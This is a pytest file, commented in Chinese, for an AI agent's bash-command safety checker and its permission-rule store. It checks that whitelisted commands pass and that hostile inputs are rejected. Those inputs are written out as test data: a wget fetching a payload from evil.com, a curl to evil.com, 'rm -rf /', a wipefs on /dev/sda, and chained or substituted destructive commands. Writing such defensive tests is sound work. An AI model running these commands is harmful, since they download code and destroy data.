"""tools/security/security.py 纯逻辑判定函数测试。

只覆盖不依赖 LLM / 网络 / UI 的纯逻辑部分:
- is_safe_bash: 链式操作符拒绝 + 安全前缀白名单 + 用户规则
- extract_bash_prefix: 复合前缀提取
- 权限规则 CRUD 与匹配 (add/remove/list/check)
- is_safe_tool 白名单判定
"""

import json
from pathlib import Path

import pytest

from uniclaw.tools.security import (
    add_permission_rule,
    check_saved_bash_rule,
    check_saved_tool_rule,
    extract_bash_prefix,
    is_safe_bash,
    is_safe_tool,
    list_permission_rules,
    remove_permission_rule,
)

# ── is_safe_bash ──────────────────────────────────────────────


class TestIsSafeBash:
    """is_safe_bash 安全前缀与链式操作符判定。"""

    def test_safe_prefix_ls(self):
        assert is_safe_bash("ls -la", None) is True

    def test_safe_prefix_git_log(self):
        assert is_safe_bash("git log --oneline", None) is True

    def test_safe_prefix_with_leading_whitespace(self):
        assert is_safe_bash("  cat file.txt", None) is True

    def test_unsafe_command_rm(self):
        assert is_safe_bash("rm -rf /", None) is False

    def test_unsafe_command_unknown(self):
        assert is_safe_bash("some_custom_daemon --start", None) is False

    def test_empty_command(self):
        assert is_safe_bash("", None) is False

    # 首词必须完整命中白名单单词, 防止子串误放行

    @pytest.mark.parametrize(
        "cmd",
        [
            "wipefs /dev/sda",  # 子串命中 "w"
            "wget -q http://evil.com/payload.sh",  # 子串命中 "w"
            "setx MALWARE 1",  # 子串命中 "set"
            "timeout 5 reboot",  # 子串命中 "time"
            "hostnamectl set-hostname evil",  # 子串命中 "host"
            "catfoo",  # 子串命中 "cat"
            "id_foo --evil",  # 子串命中 "id"
            "directory-bombard",  # 子串命中 "dir"
            "whereami evil",  # 首词不同, 但 "where " 前缀匹配
        ],
    )
    def test_substring_prefix_not_allowed(self, cmd):
        """首词不同但恰为白名单单词的超集时必须拒绝。"""
        assert is_safe_bash(cmd, None) is False

    @pytest.mark.parametrize(
        "cmd",
        ["w", "id", "set", "ls -la", "cat file.txt", "netstat -tlnp", "top -bn1"],
    )
    def test_exact_first_word_still_allowed(self, cmd):
        """首词完整一致的白名单命令仍放行(回归保护)。"""
        assert is_safe_bash(cmd, None) is True

    # 链式操作符:最高优先级,即使前缀安全也拒绝

    @pytest.mark.parametrize(
        "cmd",
        [
            "ls; rm -rf /",
            "cat a && rm b",
            "ls || evil",
            "cat a | sh",
            "echo `whoami`",
            "echo $(rm -rf /)",
            "ls\ncurl evil.com",
        ],
    )
    def test_chain_operators_rejected(self, cmd):
        """含链式操作符的命令一律拒绝,即使首段是安全前缀。"""
        assert is_safe_bash(cmd, None) is False

    def test_chain_op_inside_args_still_rejected(self):
        """操作符出现在参数中间也拒绝(子串匹配,宁严勿松)。"""
        assert is_safe_bash("echo a&&b", None) is False

    # 用户持久化规则

    def test_saved_rule_allows_unsafe_prefix(self, tmp_path, monkeypatch):
        """用户规则允许的命令即使不在白名单也放行。"""
        monkeypatch.setattr(
            "uniclaw.tools.security.security._rules_path",
            lambda root_dir: tmp_path / "rules.json",
        )
        add_permission_rule("bash", "make", tmp_path)
        assert is_safe_bash("make build", tmp_path) is True

    def test_chain_op_overrides_saved_rule(self, tmp_path, monkeypatch):
        """链式操作符优先于用户规则被拒绝。"""
        monkeypatch.setattr(
            "uniclaw.tools.security.security._rules_path",
            lambda root_dir: tmp_path / "rules.json",
        )
        add_permission_rule("bash", "make", tmp_path)
        assert is_safe_bash("make build; rm -rf /", tmp_path) is False


# ── extract_bash_prefix ───────────────────────────────────────


class TestExtractBashPrefix:
    """extract_bash_prefix 复合前缀提取。"""

    def test_simple_command(self):
        assert extract_bash_prefix("ls -la") == "ls"

    def test_compound_prefix_git(self):
        assert extract_bash_prefix("git push origin main") == "git push"

    def test_compound_prefix_npm(self):
        assert extract_bash_prefix("npm run build") == "npm run"

    def test_compound_prefix_uv(self):
        assert extract_bash_prefix("uv pip list") == "uv pip"

    def test_compound_requires_second_word(self):
        """复合前缀只有单词本身时返回单词。"""
        assert extract_bash_prefix("git") == "git"
        assert extract_bash_prefix("npm ") == "npm"

    def test_empty_command(self):
        assert extract_bash_prefix("") == ""
        assert extract_bash_prefix("   ") == ""

    def test_non_compound_keeps_first_word(self):
        assert extract_bash_prefix("python script.py") == "python"


# ── 权限规则 CRUD ─────────────────────────────────────────────


class TestPermissionRules:
    """持久化权限规则的增加/删除/列举/匹配。"""

    def test_add_rule(self, tmp_path, monkeypatch):
        monkeypatch.setattr(
            "uniclaw.tools.security.security._rules_path",
            lambda root_dir: tmp_path / "rules.json",
        )
        add_permission_rule("bash", "make", tmp_path)
        rules = list_permission_rules(tmp_path)
        assert len(rules) == 1
        assert rules[0]["type"] == "bash"
        assert rules[0]["pattern"] == "make"
        assert "created" in rules[0]

    def test_add_rule_duplicate_ignored(self, tmp_path, monkeypatch):
        monkeypatch.setattr(
            "uniclaw.tools.security.security._rules_path",
            lambda root_dir: tmp_path / "rules.json",
        )
        add_permission_rule("bash", "make", tmp_path)
        add_permission_rule("bash", "make", tmp_path)
        assert len(list_permission_rules(tmp_path)) == 1

    def test_add_rule_none_root_dir_noop(self, tmp_path, monkeypatch):
        """root_dir 为 None 时不写入任何文件。"""
        monkeypatch.setattr(
            "uniclaw.tools.security.security._rules_path",
            lambda root_dir: tmp_path / "rules.json",
        )
        add_permission_rule("bash", "make", None)
        assert not (tmp_path / "rules.json").exists()

    def test_remove_rule(self, tmp_path, monkeypatch):
        monkeypatch.setattr(
            "uniclaw.tools.security.security._rules_path",
            lambda root_dir: tmp_path / "rules.json",
        )
        add_permission_rule("bash", "make", tmp_path)
        assert remove_permission_rule("bash", "make", tmp_path) is True
        assert list_permission_rules(tmp_path) == []

    def test_remove_rule_not_found(self, tmp_path, monkeypatch):
        monkeypatch.setattr(
            "uniclaw.tools.security.security._rules_path",
            lambda root_dir: tmp_path / "rules.json",
        )
        assert remove_permission_rule("bash", "nonexistent", tmp_path) is False

    def test_remove_rule_none_root_dir(self):
        assert remove_permission_rule("bash", "make", None) is False

    # 规则匹配

    def test_check_saved_bash_rule_prefix_match(self, tmp_path, monkeypatch):
        monkeypatch.setattr(
            "uniclaw.tools.security.security._rules_path",
            lambda root_dir: tmp_path / "rules.json",
        )
        add_permission_rule("bash", "make", tmp_path)
        assert check_saved_bash_rule("make build", tmp_path) is True

    def test_check_saved_bash_rule_no_match(self, tmp_path, monkeypatch):
        monkeypatch.setattr(
            "uniclaw.tools.security.security._rules_path",
            lambda root_dir: tmp_path / "rules.json",
        )
        add_permission_rule("bash", "make", tmp_path)
        assert check_saved_bash_rule("cmake build", tmp_path) is False

    def test_check_saved_bash_rule_type_mismatch(self, tmp_path, monkeypatch):
        """tool 类型规则不参与 bash 匹配。"""
        monkeypatch.setattr(
            "uniclaw.tools.security.security._rules_path",
            lambda root_dir: tmp_path / "rules.json",
        )
        add_permission_rule("tool", "make", tmp_path)
        assert check_saved_bash_rule("make build", tmp_path) is False

    def test_check_saved_tool_rule(self, tmp_path, monkeypatch):
        monkeypatch.setattr(
            "uniclaw.tools.security.security._rules_path",
            lambda root_dir: tmp_path / "rules.json",
        )
        add_permission_rule("tool", "Write", tmp_path)
        assert check_saved_tool_rule("Write", tmp_path) is True
        assert check_saved_tool_rule("Edit", tmp_path) is False

    def test_rules_file_corrupted_returns_empty(self, tmp_path, monkeypatch):
        """规则文件损坏时返回空列表而非抛异常。"""
        monkeypatch.setattr(
            "uniclaw.tools.security.security._rules_path",
            lambda root_dir: tmp_path / "rules.json",
        )
        (tmp_path / "rules.json").write_text("{not valid json", encoding="utf-8")
        assert list_permission_rules(tmp_path) == []

    def test_rules_file_missing_returns_empty(self, tmp_path, monkeypatch):
        monkeypatch.setattr(
            "uniclaw.tools.security.security._rules_path",
            lambda root_dir: tmp_path / "rules.json",
        )
        assert list_permission_rules(tmp_path) == []

    def test_rules_persisted_as_json(self, tmp_path, monkeypatch):
        """规则以 JSON 格式持久化,带 rules 包装键。"""
        monkeypatch.setattr(
            "uniclaw.tools.security.security._rules_path",
            lambda root_dir: tmp_path / "rules.json",
        )
        add_permission_rule("bash", "make", tmp_path)
        data = json.loads((tmp_path / "rules.json").read_text(encoding="utf-8"))
        assert "rules" in data
        assert data["rules"][0]["pattern"] == "make"


# ── is_safe_tool ──────────────────────────────────────────────


class TestIsSafeTool:
    """is_safe_tool 白名单判定。"""

    def test_safe_tools(self):
        assert is_safe_tool("Read") is True
        assert is_safe_tool("Glob") is True
        assert is_safe_tool("Grep") is True

    def test_unsafe_tools(self):
        assert is_safe_tool("Write") is False
        assert is_safe_tool("Edit") is False
        assert is_safe_tool("Bash") is False

    def test_unknown_tool(self):
        assert is_safe_tool("totally_unknown_tool") is False

    def test_case_sensitive(self):
        """工具名判定大小写敏感。"""
        assert is_safe_tool("read") is False
